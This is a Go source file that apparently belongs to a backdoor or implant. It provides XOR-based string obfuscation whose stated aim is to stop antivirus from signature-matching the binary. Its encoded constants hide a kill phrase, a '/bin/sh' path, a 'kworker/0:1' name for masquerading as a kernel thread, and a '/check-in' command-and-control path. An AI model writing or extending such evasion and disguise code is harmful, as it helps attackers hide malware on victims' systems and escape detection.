package obf

// k is the XOR key for compile-time string obfuscation.
const k = byte(0x5A)

// D decodes a XOR-encoded byte slice to a string at runtime.
func D(b []byte) string {
	r := make([]byte, len(b))
	for i, c := range b {
		r[i] = c ^ k
	}
	return string(r)
}

// Pre-computed XOR(0x5A) encoded string constants.
// These eliminate plaintext strings from the binary that AV can signature-match.

// KillPhrase decodes to "baturnoff0"
var KillPhrase = []byte{0x38, 0x3B, 0x2E, 0x2F, 0x28, 0x34, 0x35, 0x3C, 0x3C, 0x6A}

// ShBin decodes to "/bin/sh"
var ShBin = []byte{0x75, 0x38, 0x33, 0x34, 0x75, 0x29, 0x32}

// Masq decodes to "kworker/0:1"
var Masq = []byte{0x31, 0x2D, 0x35, 0x28, 0x31, 0x3F, 0x28, 0x75, 0x6A, 0x60, 0x6B}

// CheckinPath decodes to "/check-in"
var CheckinPath = []byte{0x75, 0x39, 0x32, 0x3F, 0x39, 0x31, 0x77, 0x33, 0x34}

